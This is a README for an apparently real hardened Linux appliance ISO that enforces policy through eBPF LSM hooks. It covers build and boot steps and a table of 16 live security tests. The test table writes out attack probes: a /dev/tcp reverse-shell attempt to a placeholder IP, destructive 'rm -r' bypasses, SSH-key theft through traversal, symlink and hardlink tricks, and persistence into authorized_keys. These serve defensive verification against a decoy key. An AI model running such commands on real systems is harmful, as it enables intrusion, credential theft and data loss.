# Immutable Hardened Appliance ISO

Ringwall ships an automated builder (`iso/build-iso.sh`) and a headless QEMU live-attack verification suite (`iso/test-qemu.sh`) that produce a ~194 MB hybrid **BIOS + UEFI** bootable Linux appliance ISO based on minimal Debian Bookworm.

---

## Security Properties of the ISO

- **Read-only SquashFS root filesystem + ephemeral RAM overlay:** runtime modifications live only in RAM and are wiped cleanly on reboot.
- **Synchronous eBPF LSM enabled in GRUB boot parameters:**
  ```text
  lsm=lockdown,yama,integrity,apparmor,bpf ringwall.slot=A lockdown=integrity init_on_alloc=1 init_on_free=1 slab_nomerge pti=on randomize_kstack_offset=on
  ```
- **Kernel sysctl profile (`/etc/sysctl.d/99-ringwall.conf`):** enables `kernel.kptr_restrict=2`, `kernel.dmesg_restrict=1`, `kernel.unprivileged_bpf_disabled=1`, `-kernel.unprivileged_userns_clone=0`, `net.core.bpf_jit_harden=2`, `kernel.yama.ptrace_scope=2`, `kernel.sysrq=0`, `-kernel.io_uring_disabled=2`, `fs.protected_hardlinks=1`, `fs.protected_symlinks=1`, `fs.suid_dumpable=0`, and IPv4/IPv6 redirect hardening.
- **Default-deny `nftables` firewall:** `packaging/nftables.conf` is pre-installed and `enforcer.enable_nftables: true` is automatically enabled inside the ISO.
- **No SSH server & locked accounts:** OpenSSH is not installed (`allowed_ssh=0`); both `root` and `operator` passwords are locked (`passwd -l`). Local/serial consoles auto-login as strictly unprivileged `operator` (no `sudo`, no access to `/run/ringwall/api.token` or `/var/log/ringwall/audit.jsonl`).
- **Pre-seeded decoy canary:** `/home/operator/.ssh/id_ed25519` plus a preexisting SquashFS hardlink `/home/operator/preexisting_hardlink_canary` (harmless fake string `RINGWALL-CANARY-DECOY-NOT-A-REAL-PRIVATE-KEY`) let users and CI verify live kernel `-EPERM` blocking immediately after boot.

---

## Building the ISO Yourself

### Prerequisites (Debian / Ubuntu)

```bash
sudo apt-get update
sudo apt-get install -y --no-install-recommends \
  clang llvm libbpf-dev linux-libc-dev make \
  debootstrap squashfs-tools xorriso grub-pc-bin grub-efi-amd64-bin \
  mtools dosfstools qemu-system-x86 python3
```

### Build & Verify

```bash
# 1. Build eBPF bytecode + static Linux binaries + bootable ISO:
make iso

# 2. Boot the freshly built ISO in QEMU and run all 16 live attack assertions:
make test-iso
```

### Customizing the Build

- **Custom output path:**
  ```bash
  sudo ./iso/build-iso.sh --out dist/my-ringwall.iso
  ```
- **Embed a local GGUF AI model for 100% airgapped triage:**
  ```bash
  sudo ./iso/build-iso.sh --with-model /path/to/qwen2.5-coder-7b-abliterated.gguf
  ```
  The model is installed read-only at `/usr/share/ringwall/models/<filename>`.
- **Pinned/reproducible builds:** set `DEBIAN_MIRROR` (e.g. a `snapshot.debian.org` timestamp URL) and `SOURCE_DATE_EPOCH` before invoking `build-iso.sh`.

---

## Booting in QEMU or Flashing to USB

### Headless QEMU (Serial Console)

```bash
# Linux with KVM acceleration:
qemu-system-x86_64 -enable-kvm -cpu host -m 1536 -smp 2 -nographic \
  -cdrom dist/ringwall-appliance-amd64.iso -boot d

# Without KVM (TCG software emulation):
qemu-system-x86_64 -cpu max -m 1536 -smp 2 -nographic \
  -cdrom dist/ringwall-appliance-amd64.iso -boot d
```

Inside the booted appliance (as unprivileged `operator`):
- Read public daemon health status: `cat /run/ringwall-status/status.json`
- Compare supported AI providers: `ringwallctl providers`
- Try reading the canary key (blocked synchronously by kernel `-EPERM`): `cat ~/.ssh/id_ed25519`

### Writing to a USB Stick (Hybrid BIOS + UEFI)

Verify the target block device carefully (e.g. `lsblk`) before writing:

```bash
sudo dd if=ringwall-v0.2.0-appliance-amd64.iso of=/dev/sdX bs=4M status=progress oflag=sync
```

---

## All 16 Live QEMU Security Assertions (`iso/test-qemu.sh`)

Every CI run and GitHub Release run boots the exact built `.iso` in QEMU as unprivileged `operator` and asserts all 16 checks live:

| # | Assertion | Expected Live Result |
|---|---|---|
| 1 | Immutable base & no SSH | Lower rootfs mounted `squashfs ... ro`, `/usr/sbin/sshd` absent |
| 2 | Live eBPF LSM active + slot arg | `sensor_mode: ebpf`, `open_hook: lsm/file_open`, `lsm_enforce_active: true`, `ringwall.slot=A` in `/proc/cmdline` |
| 3 | Root-only control plane isolation | `operator` denied `/run/ringwall/api.token` and `audit.jsonl`; unauthenticated API returns HTTP `401` |
| 4 | `io_uring_setup` evasion guard | Direct `syscall(425)` caught by eBPF and frozen (`T (stopped)`) |
| 5 | Direct SSH private-key read | `open('/home/operator/.ssh/id_ed25519')` returns `EPERM` (`errno=1`), 0 bytes leaked |
| 6 | Traversal normalization bypasses | `/usr/../home/operator/.ssh/id_ed25519` and `//home/operator/.ssh/id_ed25519` both return `EPERM` (0 bytes leaked) |
| 7 | Hardlink-proof inode pinning | New `ln` blocked (`NEW_HL_BLOCKED`) AND preexisting SquashFS hardlink `/home/operator/preexisting_hardlink_canary` returns `EPERM` (0 bytes leaked) |
| 8 | Anti-spoof caller inode check | `cp /bin/cat /tmp/ssh && /tmp/ssh ~/.ssh/id_ed25519` returns `Operation not permitted` (0 bytes leaked) |
| 9 | Symlink & `cwd` TOCTOU proofs | Directory symlink (`/tmp/d_race/id_ed25519`) and `os.chdir('~/.ssh'); os.open('id_ed25519')` both return `EPERM` |
| 10 | Userns + non-`/home` dot-dir | `USERNS_SYSCTL=0` blocks `unshare -Ur chroot`; `/tmp/alt/.ssh/id_ed25519` returns `EPERM` |
| 11 | Persistence via rename & symlink | `os.rename` and `os.symlink` into `~/.ssh/authorized_keys` both frozen (`T (stopped)`) via parent-only resolution |
| 12 | Destructive `rm` bypasses | `rm --r /usr` (GNU abbreviation) and `cd / && rm -r usr` (relative target) both frozen (`T (stopped)`) |
| 13 | Reverse-shell execution | `bash -c 'echo /dev/tcp/198.51.100.42/4444 ...'` frozen (`T (stopped)`) |
| 14 | Signed Ed25519 A/B tooling | Live `ab-keygen` + `ab-sign` + `ab-verify` passes and rejects tampered manifest |
| 15 | Telemetry integrity & catalog | Non-zero real incidents recorded, `dropped_events: 0` under normal load, `ringwallctl providers` succeeds |
| 16 | Fail-closed under ringbuf flood | 4 concurrent UDP `sendto` flood workers saturating ringbuf while reading `~/.ssh/id_ed25519` STILL returns `EPERM` (`errno=1`, 0 bytes leaked) |
